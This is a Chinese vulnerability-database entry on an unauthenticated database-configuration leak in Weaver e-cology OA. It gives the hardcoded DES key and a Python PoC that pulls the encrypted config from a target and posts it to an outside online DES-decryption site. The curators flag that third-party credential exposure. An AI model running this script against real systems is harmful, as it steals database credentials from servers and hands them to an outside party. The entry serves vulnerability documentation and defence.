---
source: "Threekiii/Vulnerability-Wiki"
title: "泛微e-cology DBconfigReader数据库配置泄露"
product: "泛微e-cology"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "已知8.100.0531，其余7/8/9只是未排除"
prerequisites: "声称直接访问无需认证"
side_effects: "在线解密或外部服务可能收到凭据及敏感内容"
review_date: "2026-10-02"
source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEOA-DBconfigReader.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md"
id: "vw-1e3c127e9620ce8b0dae04fe"
entity_id: "ve-1e3c127e9620ce8b0dae04fe"
schema_version: "1"
---

# 泛微e-cology DBconfigReader数据库配置泄露

## 条目说明

- 对象与具体问题：泛微e-cology；DBconfigReader数据库配置泄露
- 版本、配置及部署条件：已知8.100.0531，其余7/8/9只是未排除
- 认证与权限前提：声称直接访问无需认证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- Python2代码将数据库配置原始内容发送tool.chacuo.net在线解密，存在额外第三方凭证泄漏，应警示并改离线方案（仅建议不执行）
- 12字节DESKeySpec取首8字节并不意味着两个独立密钥，文中建议按规律爆破需校正
- 可与Java离线解密篇互补；明确已知/疑似版本不可统一受影响
- 只有源码截图和外链，缺原始加密响应样例及修复版本

## 操作风险

在线解密或外部服务可能收到凭据及敏感内容。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 漏洞描述

2019年10月24日，360CERT监测到友商发布了泛微e-cology OA数据库配置信息泄漏漏洞预警，漏洞等级中。

攻击者可通过存在漏洞的页面直接获取到数据库配置信息。如果攻击者可直接访问数据库，则可直接获取用户数据，甚至可以直接控制数据库服务器。

360CERT判断漏洞等级为中，危害面/影响面低。建议使用泛微e-cology OA的用户及时安装最新补丁，以免遭受黑客攻击。

### 漏洞影响

```
目前已知为8.100.0531,不排除其他版本，包括不限于EC7.0、EC8.0、EC9.0版
```

### 漏洞复现

根据源码可以得到DES密钥为 1z2x3c4v5b6n（也有1z2x3c4v的,可以按此规律来爆破）

![image-20220209103714654](./.resource/泛微OA-DBconfigReader.jsp-数据库配置信息泄漏漏洞/media/202202091037951.png)


可以看到会将当前连接数据库的用户名密码，url，logintype等信息进行des加密，并最终进行返回，可以直接通过des解密获取泄露信息。


### 漏洞POC

[Github链接](https://github.com/ianxtianxt/ecologyExp.jar)

python代码


```python
import base64
import requests
import ast

def req(url):
	headers =  {
        'Content-Type':'application/x-www-form-urlencoded',
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    }

	r1 = requests.get(url,headers=headers).content
	s = r1.replace('\r\n','')
	res1 = base64.b64encode(s)
	
	postdata = {
		'data':res1,
		'type':'des',
		'arg':'m=ecb_pad=zero_p=1z2x3c4v_o=0_s=gb2312_t=1'
	}
	u = 'http://tool.chacuo.net/cryptdes'
	r2 = requests.post(u,data=postdata,headers=headers).content	
	res2 = ast.literal_eval(r2)
	
	return res2['data']

url = 'http://xxx.xxx.xxx.xxx:8888//mobile/DBconfigReader.jsp'
print req(url)
```


### 参考文章


[[更新\]泛微e-cology OA数据库配置信息泄漏漏洞预警](https://mp.weixin.qq.com/s/zTEUan_BtDDzuHzmd9pxYg)


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
